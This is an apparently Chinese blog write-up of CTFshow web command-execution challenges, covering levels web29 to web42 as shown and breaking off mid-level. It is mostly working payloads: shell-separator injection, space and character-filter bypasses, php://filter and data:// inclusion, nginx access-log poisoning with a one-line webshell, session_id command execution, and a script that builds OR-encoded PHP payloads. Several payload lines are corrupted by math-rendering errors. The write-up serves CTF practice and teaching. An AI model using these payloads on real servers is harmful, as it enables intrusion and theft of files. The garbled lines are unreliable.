<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTFshow-web入门-rce-web29-124 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/5a9796c83a5333c49f1b3b398284e927/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="CTFshow-web入门-rce-web29-124">
  <meta property="og:description" content="写在前面 用于命令执行的常见姿势 system
exec
passthru
shell_exec
include(文件包含漏洞，配合php伪协议)
一些常见的绕过方式 Windows支持： |直接执行后面的语句 ping 127.0.0.1|whoami
||前面出错执行后面的 ，前面为假 ping 2||whoami
&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami
&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami
%0a 回车
%1a 作为.bat文件的命令分隔符
Linux支持: ;前面的执行完执行后面的 ping 127.0.0.1;whoami
|管道符，显示后面的执行结果 ping 127.0.0.1|whoami
||当前面的执行出错时执行后面的 ping 1||whoami
&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami
&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami
%0a 回车
%0d 换行
过滤空格绕过 使用&lt;代替空格
使用${IFS}代替空格
IFS变量的相关信息：
Shell把变量IFS内的每一个字符都当做是一个分割符(delimeter)，用这些字符作为每一个字段的结束符来进行分割。如果IFS没有设置，或者IFS的值被设置为&#34;\t\n&#34;(space, tab和 newline)，那么操作对象的开始和结束处的所有space, tab和newline序列都将被忽略，但是操作对象中间的space, tab和newline序列会作为界定符工作。如果IFS值不是默认值(例如程序中对IFS进行设置过)，只有出现在IFS内的空白字符(可能是space, tab或newline中的一个或几个)才会在单词开始和结束处被忽略，这里说的是单词，而不是整个操作对象。IFS内的非空白字符多个连续出现时，每个非空白字符会被当做单独的分隔符看待，但是多个连续的空白字符会被当做一个分隔符看待。如果IFS为空(“null”)，则不会进行单词分割。 使用$IFS代替空格
过滤斜杠/绕过 使用${HOME:0:1}代替
php伪协议 PHP 伪协议是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。
伪协议功能file://访问本地文件系统http://访问 HTTP(s) 网址php://访问各个输入/输出流phar://PHP 归档zip://压缩流 例如在 allow_url_include = on 时服务器上有个文件叫 index.">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-17T23:41:27+08:00">
    <meta property="article:modified_time" content="2024-07-17T23:41:27+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTFshow-web入门-rce-web29-124</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h4><a id="_1"></a>写在前面</h4> 
<h5><a id="_3"></a>用于命令执行的常见姿势</h5> 
<p>system</p> 
<p>exec</p> 
<p>passthru</p> 
<p>shell_exec</p> 
<p>include(文件包含漏洞，配合php伪协议)</p> 
<h5><a id="_15"></a>一些常见的绕过方式</h5> 
<h6><a id="Windows_17"></a>Windows支持：</h6> 
<p>|直接执行后面的语句 ping 127.0.0.1|whoami<br> ||前面出错执行后面的 ，前面为假 ping 2||whoami<br> &amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br> &amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p> 
<p>%0a 回车</p> 
<p>%1a 作为.bat文件的命令分隔符</p> 
<h6><a id="Linux_28"></a>Linux支持:</h6> 
<p>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br> |管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br> ||当前面的执行出错时执行后面的 ping 1||whoami<br> &amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br> &amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p> 
<p>%0a 回车</p> 
<p>%0d 换行</p> 
<h6><a id="_40"></a>过滤空格绕过</h6> 
<p>使用&lt;代替空格</p> 
<p>使用${IFS}代替空格</p> 
<blockquote> 
 <p>IFS变量的相关信息：</p> 
 <ul><li>Shell把变量IFS内的每一个字符都当做是一个分割符(delimeter)，用这些字符作为每一个字段的结束符来进行分割。</li><li>如果IFS没有设置，或者IFS的值被设置为"\t\n"(space, tab和 newline)，那么操作对象的开始和结束处的所有space, tab和newline序列都将被忽略，但是操作对象中间的space, tab和newline序列会作为界定符工作。</li><li>如果IFS值不是默认值(例如程序中对IFS进行设置过)，只有出现在IFS内的空白字符(可能是space, tab或newline中的一个或几个)才会在单词开始和结束处被忽略，这里说的是单词，而不是整个操作对象。</li><li>IFS内的非空白字符多个连续出现时，每个非空白字符会被当做单独的分隔符看待，但是多个连续的空白字符会被当做一个分隔符看待。</li><li>如果IFS为空(“null”)，则不会进行单词分割。</li></ul> 
</blockquote> 
<p>使用$IFS代替空格</p> 
<h6><a id="_56"></a>过滤斜杠/绕过</h6> 
<p>使用${HOME:0:1}代替</p> 
<h6><a id="php_60"></a>php伪协议</h6> 
<p>PHP 伪协议是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p> 
<table><thead><tr><th>伪协议</th><th>功能</th></tr></thead><tbody><tr><td>file://</td><td>访问本地文件系统</td></tr><tr><td>http://</td><td>访问 HTTP(s) 网址</td></tr><tr><td>php://</td><td>访问各个输入/输出流</td></tr><tr><td>phar://</td><td>PHP 归档</td></tr><tr><td>zip://</td><td>压缩流</td></tr></tbody></table> 
<p>例如在 allow_url_include = on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span>
</code></pre> 
<p>稍微解释下这个做法，php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 php://input，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p> 
<h6><a id="data__82"></a>data 伪协议</h6> 
<p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p> 
<pre><code>data://text/plain;base64,xxxx(base64编码后的数据)
</code></pre> 
<h6><a id="_90"></a>无回显命令执行</h6> 
<p>1.tee 从标准输入读取，再写入标准输出和文件。</p> 
<p>2.反弹shell</p> 
<p>3.dnslog外带</p> 
<h6><a id="_98"></a>下划线的正则绕过</h6> 
<p>这个正则的绕过方法就是利用特性来绕过，可以用</p> 
<p>[</p> 
<p>(空格)</p> 
<p>+</p> 
<p>.</p> 
<p>上面那几个字符任何一个都行，都可以被处理成_</p> 
<h4><a id="web29124_112"></a>web29-124</h4> 
<h5><a id="web29_114"></a>web29</h5> 
<p>只是过滤了简单的flag字符，直接使用system函数</p> 
<p>Payload:</p> 
<blockquote> 
 <p>1、用egrep效果一样egrep=grep -E<br> c=system(“cat fl<em>g.php | grep -E ‘fl.g’ ");<br> 2、此种方式需要右键源代码<br> c=system("cat fl</em>g.php”);<br> 3、</p> 
 <p>c=system(“tac fl<em>g.php");<br> 4、倒序输出文本<br> c=system("tac fl</em>ag.php”);<br> 5、<br> c=system("cp fl*g.php a.txt ");<br> 访问/a.txt<br> 6、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码<br> c=system(‘echo -e " &lt;?php \n error_reporting(0); \n $c= $_GET[‘c’]; \n eval($c); " &gt; a.php’);<br> /a.php?c=system(“tac flag.php”);</p> 
</blockquote> 
<h5><a id="web30_136"></a>web30</h5> 
<p>过滤了system函数，可以用反引号来命令执行</p> 
<p>Payload:</p> 
<blockquote> 
 <p>1、nl命令，带着行号输出文本内容<br> c=echo <code>nl fl''ag.p''hp</code>;<br> echo <code>cat fl''ag.p''hp</code>;<br> echo <code>cat fl*ag.p*hp</code>;<br> echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br> 单引号：引号里面的内容会原封不动的显示出来（很简单，不做解释）<br> 双引号：里面的特殊符号会被解析，变量也会被替换（\ 符号、空格会被解析）<br> echo \a -&gt; a<br> echo “\a” -&gt; \a<br> 2、passthru函数，同system，同理exec，shell_exec也可以用，不过有点麻烦<br> c=passthru(“cat fla*”);<br> c=exec(passthru(“cat fla*”));<br> c=shell_exec(passthru(“cat fla*”));</p> 
</blockquote> 
<h5><a id="web31_156"></a>web31</h5> 
<p>题目过滤了空格，单引号，小数点，</p> 
<p>过滤了空格，可以使用%09替代；也可以使用{<!-- --><span class="katex--inline">KaTeX parse error: Expected 'EOF', got '}' at position 4: IFS}̲，因为单引号被过滤了，所以如果…</span>IFS}都不会被解释为空格</p> 
<p>所以构造如下Payload:</p> 
<blockquote> 
 <p>1、使用eval嵌套。具体参数：passthru 结合%09，也可以直接rce，因为没有对其他参数进行过滤<br> 其中%09绕过空格 ?c=eval($_GET[1]);&amp;1=passthru(“tac%09fla*”); 这里需要注意括号的闭合，&amp;的连接。<br> 2、使用参数：passthru结合 $IFS<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          9 
         
        
          其中 
         
        
       
         9 其中 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6833em;"></span><span class="mord">9</span><span class="mord cjk_fallback">其中</span></span></span></span></span>IFS<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          9 
         
        
          绕过空格，注意转义 
         
        
       
         9绕过空格，注意转义 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6833em;"></span><span class="mord">9</span><span class="mord cjk_fallback">绕过空格，注意转义</span></span></span></span></span>符号 ?<br> <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          9 
         
        
          是当前系统 
         
        
          s 
         
        
          h 
         
        
          e 
         
        
          l 
         
        
          l 
         
        
          进程的第九个参数的持有者，它始终为空字符串。 
         
        
          c 
         
        
          = 
         
        
          e 
         
        
          v 
         
        
          a 
         
        
          l 
         
        
          ( 
         
        
       
         9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。c=eval( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord">9</span><span class="mord cjk_fallback">是当前系统</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right: 0.0197em;">ll</span><span class="mord cjk_fallback">进程的第九个参数的持有者，它始终为空字符串。</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mopen">(</span></span></span></span></span>_GET[1]);&amp;1=passthru(“tac$IFS$9fla*”);<br> 3、使用未被过滤的命令。passthru直接读取<br> ?c=passthru(%22tac$IFS$9fla*%22); 也就是passthru(“tac$IFS$9fla*”);<br> 4、使用pos(localeconv)来获取小数点<br> localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c=print_r(scandir(pos(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p> 
</blockquote> 
<h5><a id="web32nginx_174"></a>web32(nginx日志注入)</h5> 
<p>过滤掉了flag|system|php|cat|sort|shell|.| |'|`|echo|;|( 包括点，单引号，反引号，分号，括号</p> 
<p>所以这里需要使用include来构造Payload:</p> 
<blockquote> 
 <p>1、?c=include<span class="katex--inline">KaTeX parse error: Expected 'EOF', got '&amp;' at position 10: _GET[1]?&gt;&amp;̲1=php://filter/…</span>_GET[1]?%3E&amp;1=…/…/…/…/var/log/nginx/access.log<br> /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p> 
 <p>3、?c=include$_GET[1]?&gt;&amp;1=php://input</p> 
 <p>也可以使用php://input然后使用post执行命令&lt;?php system("cat flag.php")?&gt;</p> 
</blockquote> 
<h5><a id="web33_190"></a>web33</h5> 
<p>相比上一关只多过滤了“</p> 
<p>所以web32Payload依旧适用</p> 
<h5><a id="web34_196"></a>web34</h5> 
<p>多过滤一个: 之前payload依旧适用</p> 
<h5><a id="web35_200"></a>web35</h5> 
<p>多过滤一个= &lt; 之前payload依旧适用</p> 
<h5><a id="web36_204"></a>web36</h5> 
<p>多过滤了数字 GET参数改为a即可</p> 
<h5><a id="web37_208"></a>web37</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg <span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span>，<span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>1、使用php://input POST写入php代码</p> &lt;?php system("cat fla*")?&gt; 
 <p>2、使用data协议</p> 
 <p>c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p> &lt;?php system("tac flag.php") ?&gt; 
</blockquote> 
<h5><a id="web38_229"></a>web38</h5> 
<p>web37Payload照样打</p> 
<h5><a id="web39_233"></a>web39</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
</code></pre> 
<p>?c=data://text/plain,&lt;?php%20system("tac fla*.php");?&gt;<br> ?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管</p> 
<h5><a id="web40_244"></a>web40(数组函数)</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
     
</code></pre> 
<p>这次添加了很多过滤，之前方法大多都不行了</p> 
<blockquote> 
 <p>1、c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c=show_source(next(array_reverse(scandir(getcwd()))));</p> 
 <p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p> 
 <p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."</p> 
 <p>pos():输出数组第一个元素，不改变指针；</p> 
 <p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p> 
 <p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录</p> 
 <p>array_reverse():数组逆置</p> 
 <p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p> 
 <p>show_source():查看源码</p> 
 <p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p> 
 <p>每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。</p> 
 <p>提示：该函数不会移动数组内部指针。</p> 
 <p>相关的方法：</p> 
 <p>current()返回数组中的当前元素的值。</p> 
 <p>end()将内部指针指向数组中的最后一个元素，并输出。</p> 
 <p>next()将内部指针指向数组中的下一个元素，并输出。</p> 
 <p>prev()将内部指针指向数组中的上一个元素，并输出。</p> 
 <p>reset()将内部指针指向数组中的第一个元素，并输出。</p> 
 <p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p> 
 <p>2、c=eval(array_pop(next(get_defined_vars())));//需要POST传入参数为1=system(‘tac fl*’);</p> 
 <p>同理?cmd=system(“tac%20flag.php”);&amp;c=eval(pos(pos(get_defined_vars())));</p> 
 <p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p> 
 <p>next()将内部指针指向数组中的下一个元素，并输出。</p> 
 <p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p> 
 <p>3、c=session_start();system(session_id());<br> passid=ls</p> 
 <p><img src="https://images2.imgbox.com/ee/c3/eSBWtG2e_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<blockquote> 
 <p>通过cookie获得参数进行命令执行</p> 
 <p>受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p> 
</blockquote> 
<h5><a id="web41rce_or_313"></a>web41(rce_or)</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
</code></pre> 
<p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个<code>|</code>运算符</p> 
<p>根据正则匹配生成可用字符的集合rce_or.php</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
			<span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
			<span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
			<span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
			<span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
					<span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  
		<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
		<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>
		<span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>
		<span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> 
<p>根据可用的字符生成Payload</p> 
<pre><code class="prism language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib
<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
   s1<span class="token operator">=</span><span class="token string">""</span>
   s2<span class="token operator">=</span><span class="token string">""</span>
   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>
       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>
       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>
               <span class="token keyword">break</span>
           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>
               <span class="token comment">#print(i)</span>
               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
               <span class="token keyword">break</span>
       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>
   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
   
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>param<span class="token punctuation">)</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/12/26/JHuwE177_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="web42_400"></a>web42</h5> 
<pre><code class="prism language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> 
<p>Payload:</p> 
<blockquote> 
 <p>?c=cat flag.php; ?c=cat flag.php|| ?c=cat flag.php%26(&amp;) c=nl flag.php%0a ?c=echo <code>tac fl*</code>||</p> 
 <p>使用 " ; " " || " " &amp; " " &amp;&amp; " 分隔</p> 
